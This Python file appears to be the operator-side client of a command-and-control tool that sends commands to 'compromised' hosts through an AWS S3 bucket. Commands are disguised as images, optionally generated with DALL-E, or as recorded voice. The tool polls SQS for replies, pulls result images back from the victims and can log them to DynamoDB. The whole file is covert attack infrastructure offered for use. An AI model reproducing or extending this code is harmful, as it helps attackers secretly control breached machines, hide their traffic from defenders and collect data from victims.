import argparse
import time
import cloud
import init as initialize
import processing

def main(args):
    exit = False

    # Call the initFile class to check if the file exists and create it if it doesn't
    init = initialize.initFile()
    init.check(args)

    # If the flag exists, list the buckets
    bucket = cloud.bucketFunctions()

    if args.b != None:
        bucket.bucketName = args.b
    else:
        bucket.objectList = 'compromised'
        bucket.listBucket()
        print('\nEnter bucket name: ')
        bucket.bucketName = input()
    
    # Set the SQS queue
    sqs = cloud.sqsFunctions(False)
    sqs.getUrl(bucket.bucketName)

    # Set the dynamo class
    dynamo = cloud.dynamoFunction()

    # Sets the audio processing class
    voice = processing.audioProcessing()

    print('\nIf you want to exit the app, type exit. If you want to use openai, type openai. If you want to send a voice command, type voice to use your microphone or audioFile to send a file.')
    while exit == False:
        aiResponse = 'None'

        cmdProcessing = processing.commandProcesing(init.imgDir)
        # Get the command or exit or send to openai
        print('What command or action do you want to perform: ')
        command = input()

        if 'exit' in command.lower():
            quit()
        # Check if the user wants to generate an image using Dalle
        elif 'openai' in command.lower() and 'None' not in init.dalleKey:
            aiResponse = 'retry'
            while 'retry' in aiResponse:
                print('Type out the image you want with the command. The image needs to be clear and you will be shown the image before sending it to the host.')
                prompt = input()
                aiResponse = cmdProcessing.openAI(prompt, init.dalleKey)

        # Check if the user wants to use their mic to send a command
        elif 'voice' in command.lower():
            print('WARNING: This function is not forensically safe')

            # Capture audio
            voice.capture()

            # Set the extension and mimetype
            cmdProcessing.mimeType = 'audio/wav'
            cmdProcessing.extension = 'wav'
        
        # Process an audio file
        elif 'audiofile' in command.lower():
            print('WARNING: This function is not forensically safe')
            print('What is the file path?')
            voice.audioPath = input()
            cmdProcessing.mimeType = 'audio/wav'
            voice.audioDirectory()
            cmdProcessing.extension = 'wav'
        else:
            # Calls initFile to create the image
            cmdProcessing.createImage(command)
        
        if  ('None' not in aiResponse and 'exit' not in aiResponse) or 'openai' not in command:
            # Check if the command image needs to be saved
            if args.commImage == True:
                try:
                    cmdProcessing.writeFile(str(time.time()), 'commImages')
                except:
                    pass

            # Check if the user writes to write the recording
            if args.voiceWrite == True:
                try:
                    cmdProcessing.writeAudio(directory = 'commAudio', time = str(time.time()), result = voice.result)
                except:
                    pass

            # Set the Key for the bucket and call the function
            bucket.bucketKey = 'compromised/' + bucket.bucketName + '/sendCommand/' + str(time.time()) + '.' + cmdProcessing.extension
            if 'voice' in command or 'audio' in command:
                splitMime = cmdProcessing.mimeType.split('/')
                bucket.postBucketCommand(voice.result.get_wav_data(), splitMime[0])
            else:
                bucket.postBucketCommand(cmdProcessing.imageData, cmdProcessing.mimeType[0])

            # Check the SQS for commands. This needs to check for latency issues with AWS
            i = 20
            
            while sqs.messageExist == False and i > 0:
                time.sleep(3)
                sqs.getAttributes()
                print('waiting...')

                if '0' not in sqs.messageAmount:
                    sqs.getQueue()
                i -= 1
            
            if i == 0:
                # TODO: If it hits here, a lambda function should be executed to delete anything in the SQS otherwise it will become out of sync
                print('Command lost')
            else:
                # Get the file from the bucket
                bucket.getBucketResuilt(sqs.message)

                if args.ml == True:
                    # Process the streaming data
                    cmdProcessing.streamProcess(args, bucket.streamingData)

                # Delete the key
                bucket.deleteKey(sqs.message)

                sqs.messageExist = False

                # Check if the dynamo flag is set
                if args.d == True:
                    dynamo.getTable(bucket.bucketName, sqs.messageAction, args)
                
                if args.o == True:
                    cmdProcessing.writeFile(dynamo.currentTime, 'outImages')

if __name__ == "__main__":
    # Setup the argparse
    parse = argparse.ArgumentParser()
    parse.add_argument('-p', help='Sets the PSM level. The default is 11', type=str, default='11')
    parse.add_argument('-d', help='Enables retrieving data from dynamo', action='store_true')
    parse.add_argument('-de', help='Deletes the entry within dynamodb', action='store_true')
    parse.add_argument('-l', help='Lists the hosts in the s3 bucket', action='store_true')
    parse.add_argument('-o', help='Output the images received from the compromised host', action='store_true')
    parse.add_argument('-ml', help='Analyze the image that is received from Weaver. This is less accurate.', action='store_true')
    parse.add_argument('--commImage', help='Outputs the command image', action='store_true')
    parse.add_argument('--voiceWrite', help='Outputs the recorded voice', action='store_true')
    parse.add_argument('-b', help='Sets the bucket to pull data from', type=str)
    parse.add_argument('--init', help='Initialize the config file', action='store_true')
    parse.add_argument('--reinit', help='Reinitializes the config file', action='store_true')
    parse.add_argument('--reUpload', help='Reuploads images to the s3 bucket', action='store_true')
    parse.add_argument('--dalleUpdate', help='Updates the key used for Dalle', action='store_true')
    args = parse.parse_args()

    main(args)